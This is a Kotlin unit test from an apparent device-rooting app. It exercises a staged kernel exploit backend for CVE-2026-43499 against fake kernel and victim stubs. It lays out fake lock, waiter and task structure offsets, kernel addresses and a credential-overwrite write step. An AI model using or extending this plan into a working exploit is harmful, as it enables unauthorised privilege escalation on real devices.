package com.ghostlock.app.backend.cve43499.ktstep.run

import com.ghostlock.app.core.engine.BackendRunResult
import com.ghostlock.app.core.engine.BackendRunRequest
import com.ghostlock.app.core.engine.Progress
import com.ghostlock.app.core.steps.StepId
import com.ghostlock.app.engine.ktstep.FakeKernelRoute
import com.ghostlock.app.engine.ktstep.FakeVictimProbe
import com.ghostlock.app.engine.ktstep.KtStep
import com.ghostlock.app.engine.ktstep.KtStepPlan
import com.ghostlock.app.engine.ktstep.LayoutInputs
import com.ghostlock.app.engine.ktstep.LockFields
import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.PayloadSlots
import com.ghostlock.app.engine.ktstep.PayloadValues
import com.ghostlock.app.engine.ktstep.SyscallResult
import com.ghostlock.app.engine.ktstep.TaskFields
import com.ghostlock.app.engine.ktstep.WaiterFields
import com.ghostlock.app.engine.ktstep.WriteMode
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class Cve43499BackendRunTest {
    private fun plan(): KtStepPlan {
        val layout = LayoutInputs(0x10000010001L, 0xFFFFFF802ABFD588uL.toLong(), 0x10L, 0x20L, 8)
        val page = PayloadPageInputs(
            slots = PayloadSlots(0x0E80, 0x1180, 0x1280, 0x1080, 0x0F80),
            lock = LockFields(0, 8, 16, 24),
            waiter = WaiterFields(0, 8, 16, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x44, 0x48, 0x50),
            task = TaskFields(0x40, 0x84, 0x8C, 0x90C, 0x920, 0x930, 0x938, 0x348),
            values = PayloadValues(0x100, 120, 140),
            waiterWord = 0xFFFF800000100000uL.toLong() + 0x1180L, waiterTask = 0L,
            fakeTask = 0xFFFF800000100000uL.toLong() + 0x1280L,
            fakeLock = 0xFFFF800000100000uL.toLong() + 0x0E80L,
            taskGroup = 0L, piTopTask = 0L, pointerBytes = 8,
        )
        return KtStepPlan(
            steps = mapOf(
                StepId.W1 to KtStep(StepId.W1, 0x1000L, WriteMode.Zero, true),
                StepId.W2 to KtStep(StepId.W2, 0x2000L, WriteMode.Credential, true, layout.credentialValue),
                StepId.W3 to KtStep(StepId.W3, 0x3000L, WriteMode.Zero, false),
            ),
            layoutInputs = layout, pageInputs = page, pageSize = 0x8000,
        )
    }

    @Test
    fun mapsPipelineToBackendResultAndProgress() = runBlocking {
        val progress = mutableListOf<String>()
        val result = Cve43499BackendRun(plan(), FakeKernelRoute(), probe = FakeVictimProbe(SyscallResult.Ok(0)))
            .run(BackendRunRequest("cve_2026_43499", "p", emptyMap()), Progress { name, _, _ -> progress += name })
        assertTrue(result is BackendRunResult.Ok)
        assertEquals(3, (result as BackendRunResult.Ok).steps.size)
        assertEquals(listOf("w1", "w2", "w3"), progress)
    }

    @Test
    fun rejectsBackendMismatch() = runBlocking {
        val result = Cve43499BackendRun(plan(), FakeKernelRoute(), probe = FakeVictimProbe())
            .run(BackendRunRequest("other", "p", emptyMap()), Progress { _, _, _ -> })
        assertTrue(result is BackendRunResult.Failed)
    }
}
